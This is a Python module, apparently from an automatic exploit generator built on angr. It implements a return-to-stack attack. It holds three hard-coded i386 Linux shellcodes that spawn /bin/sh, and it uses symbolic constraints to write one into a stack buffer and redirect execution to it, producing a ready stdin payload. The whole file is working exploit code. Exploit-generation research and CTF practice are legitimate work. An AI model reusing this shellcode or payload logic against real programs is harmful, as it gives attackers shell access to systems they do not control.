from ..exploit import Exploit
import logging
from ..payload import Payload

l = logging.getLogger('aegg.exploits.ret2stack')


class Ret2Stack(Exploit):
    SHELLCODES = [
        'jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80',  # 22 bytes: shellcraft i386.linux.sh
        '1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80',  # 21 bytes
        '1\xc0\xb00\x01\xc40\xc0Ph//shh/bin\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80',  # for scanf
    ]

    def __init__(self, binary, path, analysis):
        super(Ret2Stack, self).__init__(binary, path, analysis)
        self.trying = 0
        self.shellcode = Ret2Stack.SHELLCODES[self.trying]

    def _add_extra_constraints(self, buf):
        """
        Add some other constraints let the payload be exploitable.
        The purpose of this function is that ret addr of buffer offset may
        inaccurate.
        For example, angr found that:
            `payload = '\x90' * 21 + ret_addr`.
        But in real execution:
            `payload = '\x90' * 17 + ret_addr`.
        """
        esp = self.path.state.se.any_int(self.path.state.regs.esp)
        # esp - 4 is ret address
        ebp = self.path.state.memory.load(esp-8, 4, endness='Iend_LE')
        if self.path.state.satisfiable(
                extra_constraints=(ebp == buf['addr'], )):
            self.path.state.add_constraints(ebp == buf['addr'])
            l.info('Added extra constraints.')

    def _generate(self, buf):
        if buf['length'] < len(self.shellcode):
            return False
        memory = self.path.state.memory.load(buf['addr'], len(self.shellcode))
        sc = self.path.state.se.BVV(self.shellcode)

        l.debug('Checking SHELLCODES[%d] in buf len: %d, addr: 0x%x ...' %
                (self.trying, buf['length'], buf['addr']))
        if self.path.state.satisfiable(
                extra_constraints=(memory == sc,
                                   self.path.state.ip == buf['addr'])):
            l.debug('... sat!')
            self.path.state.add_constraints(memory == sc)
            self.path.state.add_constraints(self.path.state.ip == buf['addr'])
            self._add_extra_constraints(buf)

            self.payload = self.path.state.posix.dumps(0)
            return True
        l.debug('... unsat!')
        return False

    def gen_next(self):
        self.trying += 1
        if self.trying >= len(Ret2Stack.SHELLCODES):
            return False
        self.shellcode = Ret2Stack.SHELLCODES[self.trying]
        return True

    def finish(self):
        self.trying = len(Ret2Stack.SHELLCODES)

    def generate(self):
        if not self.analysis['ip_symbolic'] or self.analysis['elf']['NX']:
            l.info('Skipped ret2stack exploit.')
            self.finish()
            return ''
        for buf in self.analysis['bufs']:
            if self._generate(buf):
                return Payload(self.payload, 'string')
